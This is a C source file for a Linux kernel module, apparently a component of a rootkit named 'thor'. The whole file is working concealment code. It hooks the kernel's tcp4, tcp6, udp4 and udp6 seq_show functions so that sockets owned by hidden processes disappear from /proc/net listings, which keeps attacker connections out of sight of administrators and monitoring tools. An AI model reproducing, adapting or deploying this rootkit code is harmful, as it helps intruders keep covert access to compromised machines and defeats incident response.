#include "logging.h"
#include "pidhider.h"
#include "sockethider.h"

#include <linux/fdtable.h>
#include <linux/net.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/socket.h>
#include <linux/version.h>
#include <net/tcp.h>
#include <net/udp.h>

#include "helper.h"
#include "hijack.h"
#include "logging.h"

/* original functions which we need to hijack */
static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
static int (*tcp6_seq_show)(struct seq_file *seq, void *v);
static int (*udp4_seq_show)(struct seq_file *seq, void *v);
static int (*udp6_seq_show)(struct seq_file *seq, void *v);

/* function prototypes */
static void *get_tcp_seq_show(const char *path);
static void *get_udp_seq_show(const char *path);
static int thor_tcp4_seq_show(struct seq_file *seq, void *v);
static int thor_tcp6_seq_show(struct seq_file *seq, void *v);
static int thor_udp4_seq_show(struct seq_file *seq, void *v);
static int thor_udp6_seq_show(struct seq_file *seq, void *v);
static bool is_socket_process_hidden(struct sock *sp);

int sockethider_init(void)
{
    tcp4_seq_show = get_tcp_seq_show("/proc/net/tcp");
    if (tcp4_seq_show == NULL)
        return -1;

    tcp6_seq_show = get_tcp_seq_show("/proc/net/tcp6");
    if (tcp6_seq_show == NULL)
        return -1;

    udp4_seq_show = get_udp_seq_show("/proc/net/udp");
    if (udp4_seq_show == NULL)
        return -1;

    udp6_seq_show = get_udp_seq_show("/proc/net/udp6");
    if (udp6_seq_show == NULL)
        return -1;

    LOG_INFO("hijacking socket seq show functions");

    hijack(tcp4_seq_show, thor_tcp4_seq_show);
    hijack(tcp6_seq_show, thor_tcp6_seq_show);
    hijack(udp4_seq_show, thor_udp4_seq_show);
    hijack(udp6_seq_show, thor_udp6_seq_show);

    return 0;
}

void sockethider_cleanup(void)
{
    LOG_INFO("unhijacking socket seq show functions");

    if (tcp4_seq_show != NULL)
        unhijack(tcp4_seq_show);

    if (tcp6_seq_show != NULL)
        unhijack(tcp6_seq_show);

    if (udp4_seq_show != NULL)
        unhijack(udp4_seq_show);

    if (udp6_seq_show != NULL)
        unhijack(udp6_seq_show);
}

/* function to get a pointer to the tcp{4,6}_seq_show function */
static void *get_tcp_seq_show(const char *path)
{
    void *ret;
    struct file *filep;
    struct tcp_seq_afinfo *afinfo;

    if ((filep = filp_open(path, O_RDONLY, 0)) == NULL)
        return NULL;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
    afinfo = PDE(filep->f_dentry->d_inode)->data;
#else
    afinfo = PDE_DATA(filep->f_dentry->d_inode);
#endif
    ret = afinfo->seq_ops.show;

    filp_close(filep, 0);

    return ret;
}

/* function to get a pointer to the udp{4,6}_seq_show function */
static void *get_udp_seq_show(const char *path)
{
    void *ret;
    struct file *filep;
    struct udp_seq_afinfo *afinfo;

    if ((filep = filp_open(path, O_RDONLY, 0)) == NULL)
        return NULL;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
    afinfo = PDE(filep->f_dentry->d_inode)->data;
#else
    afinfo = PDE_DATA(filep->f_dentry->d_inode);
#endif
    ret = afinfo->seq_ops.show;

    filp_close(filep, 0);

    return ret;
}

static int thor_tcp4_seq_show(struct seq_file *seq, void *v)
{
    int ret;

    /* hide port */
    if (v != SEQ_START_TOKEN && is_socket_process_hidden(v))
        return 0;

    /*
     * TODO: this leaves the tcp4_seq_show function unhijacked for a few
     * cycles, ideally we would execute the content of tcp4_seq_show_firstinstr
     * and jump to the second instruction of the original tcp4_seq_show
     */
    unhijack(tcp4_seq_show);
    ret = tcp4_seq_show(seq, v);
    hijack(tcp4_seq_show, thor_tcp4_seq_show);

    return ret;
}

static int thor_tcp6_seq_show(struct seq_file *seq, void *v)
{
    int ret;

    /* hide port */
    if (v != SEQ_START_TOKEN && is_socket_process_hidden(v))
        return 0;

    /*
     * TODO: this leaves the tcp6_seq_show function unhijacked for a few
     * cycles, ideally we would execute the content of tcp6_seq_show_firstinstr
     * and jump to the second instruction of the original tcp6_seq_show
     */
    unhijack(tcp6_seq_show);
    ret = tcp6_seq_show(seq, v);
    hijack(tcp6_seq_show, thor_tcp6_seq_show);

    return ret;
}

static int thor_udp4_seq_show(struct seq_file *seq, void *v)
{
    int ret;

    /* hide port */
    if (v != SEQ_START_TOKEN && is_socket_process_hidden(v))
        return 0;

    /*
     * TODO: this leaves the udp4_seq_show function unhijacked for a few
     * cycles, ideally we would execute the content of udp4_seq_show_firstinstr
     * and jump to the second instruction of the original udp4_seq_show
     */
    unhijack(udp4_seq_show);
    ret = udp4_seq_show(seq, v);
    hijack(udp4_seq_show, thor_udp4_seq_show);

    return ret;
}

static int thor_udp6_seq_show(struct seq_file *seq, void *v)
{
    int ret;

    /* hide port */
    if (v != SEQ_START_TOKEN && is_socket_process_hidden(v))
        return 0;

    /*
     * TODO: this leaves the udp6_seq_show function unhijacked for a few
     * cycles, ideally we would execute the content of udp6_seq_show_firstinstr
     * and jump to the second instruction of the original udp6_seq_show
     */
    unhijack(udp6_seq_show);
    ret = udp6_seq_show(seq, v);
    hijack(udp6_seq_show, thor_udp6_seq_show);

    return ret;
}

/* true if socket is owned by a hidden process */
static bool is_socket_process_hidden(struct sock *sp)
{
    struct task_struct *task;

    /* check sp */
    if (!sp || !sp->sk_socket || !sp->sk_socket->file)
        return false;

    for_each_process(task) {
        int n = 0;
        struct fdtable *fdt;
        struct files_struct *files;

        if (!task)
            continue;

        /* skip if process is not hidden */
        if (!is_pid_hidden(task->pid))
            continue;

        /* get files (unsafe but i dont care) */
        files = task->files;

        if (!files)
            continue;

        /* go through file descriptor table */
        spin_lock(&files->file_lock);
        for (fdt = files_fdtable(files); n < fdt->max_fds; n++) {
            if (!fdt->fd[n])
                continue;

            if (sp->sk_socket->file->f_inode == fdt->fd[n]->f_inode) {
                LOG_INFO("found socket --> hide it");
                spin_unlock(&files->file_lock);
                return true;
            }
        }
        spin_unlock(&files->file_lock);
    }

    return false;
}
